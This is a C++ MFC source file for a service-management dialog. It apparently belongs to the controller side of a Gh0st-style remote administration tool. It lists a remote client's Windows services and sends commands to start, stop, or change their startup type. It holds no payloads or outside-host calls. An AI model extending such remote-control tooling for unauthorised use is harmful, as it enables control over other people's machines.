// ServicesDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Remote.h"
#include "ServicesDlg.h"
#include "afxdialogex.h"
#include "resource.h"
#include"Common.h"

// CServicesDlg 对话框

IMPLEMENT_DYNAMIC(CServicesDlg, CDialog)

enum
{
	ServicesStart = 1,
	ServicesStop,
	ServicesAuto,
	ServicesManual,

};

CServicesDlg::CServicesDlg(CWnd* pParent /*=NULL*/,IOCPServer* IOCPServer, CONTEXT_OBJECT*ContextObject )
	: CDialog(IDD_DIALOG_SERVICES, pParent)
{
	m_ContextObject = ContextObject;
	m_IocpServer = IOCPServer;
}

CServicesDlg::~CServicesDlg()
{
}

int CServicesDlg::ShowServicesList()
{
	char* szBuffer = (char*)(m_ContextObject->InDeCompressedBuffer.GetBuffer(1));
	char* szDisplayName = NULL;
	char* szServiceName = NULL;
	char* szRunWay = NULL;
	char* szAutoRun = NULL;
	char* szFileFullPath = NULL;
	DWORD dwOffset = 0;
	m_ControlList.DeleteAllItems();
	int i = 0;
	for ( i= 0 ; dwOffset < m_ContextObject->InDeCompressedBuffer.GetBufferLength() - 1;i++)
	{
		szDisplayName = szBuffer + dwOffset;
		szServiceName = szDisplayName + lstrlen(szDisplayName) + 1;
		szFileFullPath = szServiceName + lstrlen(szServiceName) + 1;
		szRunWay = szFileFullPath + lstrlen(szFileFullPath) + 1;
		szAutoRun = szRunWay + lstrlen(szRunWay) + 1;

		m_ControlList.InsertItem(i, szServiceName);
		m_ControlList.SetItemText(i, 1, szDisplayName);
		m_ControlList.SetItemText(i, 2, szAutoRun);
		m_ControlList.SetItemText(i, 3, szRunWay);
		m_ControlList.SetItemText(i, 4, szFileFullPath);

		dwOffset += lstrlen(szDisplayName) + lstrlen(szServiceName) + lstrlen(szFileFullPath) + lstrlen(szRunWay)
			+ lstrlen(szAutoRun) + 5;
	}
	CString strTemp;
	strTemp.Format("服务个数:%d", i);

	m_ServicesCount.SetWindowText(strTemp);
	return 0;
}

VOID CServicesDlg::ServicesConfig(BYTE bCmd)
{
	DWORD dwOffset = 2;
	POSITION Pos = m_ControlList.GetFirstSelectedItemPosition();
	int iItem = m_ControlList.GetNextSelectedItem(Pos);
	CString strServiceName = m_ControlList.GetItemText(iItem, 0);
	char* szServiceName = strServiceName.GetBuffer(0);
	LPBYTE szBuffer = (LPBYTE)LocalAlloc(LPTR, 3 + lstrlen(szServiceName));
	szBuffer[0] = COMMAND_SERVICECONFIG;
	szBuffer[1] = bCmd;
	memcpy(szBuffer + dwOffset, szServiceName, lstrlen(szServiceName) + 1);
	m_IocpServer->OnClientPreSending(m_ContextObject, szBuffer, LocalSize(szBuffer));
	LocalFree(szBuffer);
}

VOID CServicesDlg::OnReceiveComplete()
{
	switch (m_ContextObject->InDeCompressedBuffer.GetBuffer(0)[0])
	{
		case TOKEN_SERVERLIST:
		{
			ShowServicesList();
			break;
		}
			
		default:
			break;
	}
}

void CServicesDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST, m_ControlList);
	DDX_Control(pDX, IDC_STATIC_COUNT, m_ServicesCount);
}


BEGIN_MESSAGE_MAP(CServicesDlg, CDialog)
	ON_NOTIFY(NM_RCLICK, IDC_LIST, &CServicesDlg::OnNMRClickList)
	ON_COMMAND(ID_SERVICES_AUTO, &CServicesDlg::OnServicesAuto)
	ON_COMMAND(ID_SERVICES_MANUAL, &CServicesDlg::OnServicesManual)
	ON_COMMAND(ID_SERVICES_STOP, &CServicesDlg::OnServicesStop)
	ON_COMMAND(ID_SERVICES_START, &CServicesDlg::OnServicesStart)
	ON_COMMAND(ID_SERVICES_REFLASH, &CServicesDlg::OnServicesReflash)
	ON_WM_CLOSE()
END_MESSAGE_MAP()


// CServicesDlg 消息处理程序


BOOL CServicesDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  在此添加额外的初始化

	CString strString;
	sockaddr_in ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));
	int iClientAddressLength = sizeof(ClientAddress);
	BOOL bResult = getpeername(m_ContextObject->ClientSocket, (SOCKADDR*)&ClientAddress, &iClientAddressLength);


	strString.Format("\\\\%s - 服务管理", bResult != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "");
	SetWindowText(strString);
	//当前的扩展模式
	m_ControlList.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	m_ControlList.InsertColumn(0, "真实名称", LVCFMT_LEFT, 150);
	m_ControlList.InsertColumn(1, "显示名称", LVCFMT_LEFT, 260);
	m_ControlList.InsertColumn(2, "启动类型", LVCFMT_LEFT, 80);
	m_ControlList.InsertColumn(3, "运行状态", LVCFMT_LEFT, 80);
	m_ControlList.InsertColumn(4, "可执行文件路径", LVCFMT_LEFT, 380);


	ShowServicesList();
	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}


void CServicesDlg::OnNMRClickList(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	CMenu Menu;
	Menu.LoadMenuA(IDR_MENU_SERVICES);
	CMenu* SubMenu = Menu.GetSubMenu(0);
	CPoint Point;
	GetCursorPos(&Point);
	SubMenu->TrackPopupMenu(TPM_LEFTALIGN | TPM_LEFTBUTTON, Point.x, Point.y, this);
	*pResult = 0;
}


void CServicesDlg::OnServicesAuto()
{
	// TODO: 在此添加命令处理程序代码
	ServicesConfig(ServicesAuto);
}


void CServicesDlg::OnServicesManual()
{
	// TODO: 在此添加命令处理程序代码
	ServicesConfig(ServicesManual);
}


void CServicesDlg::OnServicesStop()
{
	// TODO: 在此添加命令处理程序代码
	ServicesConfig(ServicesStop);
}


void CServicesDlg::OnServicesStart()
{
	// TODO: 在此添加命令处理程序代码
	ServicesConfig(ServicesStart);
}

//刷新
void CServicesDlg::OnServicesReflash()
{
	// TODO: 在此添加命令处理程序代码
	BYTE bToken = COMMAND_SERVICELIST;
	m_IocpServer->OnClientPreSending(m_ContextObject, &bToken, 1);
}


void CServicesDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	m_ContextObject->v1 = 0;
	CancelIo((HANDLE)m_ContextObject->ClientSocket);
	closesocket(m_ContextObject->ClientSocket);
	CDialog::OnClose();
}
